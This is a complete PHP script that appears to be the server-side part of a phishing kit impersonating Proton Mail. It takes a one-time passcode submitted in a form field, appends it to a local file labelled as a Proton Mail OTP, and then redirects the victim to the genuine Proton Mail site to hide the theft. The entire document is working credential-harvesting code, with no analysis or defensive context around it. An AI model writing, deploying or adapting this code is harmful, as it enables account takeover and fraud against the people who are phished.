<?php
file_put_contents("otp.txt", "Proton Mail OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://protonmail.com/');
?>
